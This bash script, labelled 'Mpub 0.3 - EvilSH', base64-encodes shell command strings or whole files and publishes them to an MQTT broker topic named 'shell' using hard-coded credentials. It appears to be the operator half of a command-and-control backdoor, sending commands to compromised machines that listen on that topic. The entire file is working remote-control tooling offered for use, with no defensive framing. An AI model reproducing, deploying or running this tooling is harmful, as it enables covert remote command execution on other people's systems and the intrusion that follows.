#!/bin/bash
##############################################################################
# Mpub 0.3 - EvilSH - https://github.com/isdrupter
##############################################################################
#

# Set variables here
host='localhost'
user='loltheplanet'
ident='serveradmin'
password='lol'
topic='shell'

publish_String(){
tempf=$(mktemp /tmp/mpub.XXXXX)
cmd="$@"

echo $cmd|base64|tr -d '\n' >$tempf
mosquitto_pub -h $host -u $user -i $ident -P $password -t $topic -f $tempf
rm -f $tempf

if [[ "$?" -eq "0" ]] ; then
echo 'Successfully published command string!' ; else echo 'Error publishing command string!'
fi
}

publish_File(){
tempf=$(mktemp /tmp/mpub.XXXXX)
sendFile="$@"

cat $sendFile|base64|tr -d '\n' >$tempf
mosquitto_pub -h $host -u $user -i $ident -P $password -t $topic -f $tempf
rm -f $tempf

if [[ "$?" -eq "0" ]] ; then
echo 'Successfully published file!' ; else echo 'Error publishing file!'
fi
}


case $1 in
-m|--message) cmd="$2"
publish_String "$cmd"
;;
-f|--file) message="$2"
publish_File $message
;;
-h|--help)
echo -e '
#######################################
# Mpub v0.3
#######################################

# Usage:
# Send a command from passed string:
mpub -m|---message "shell command string"
# Send commands from local file:
mpub -f|--file </path/to/file>
# Display Help:
mpub -h|--help
'
;;

*)
echo "Invalid option."
echo "mpub -m \"message\" | -f \"file\" (usage: --help)"

esac

exit
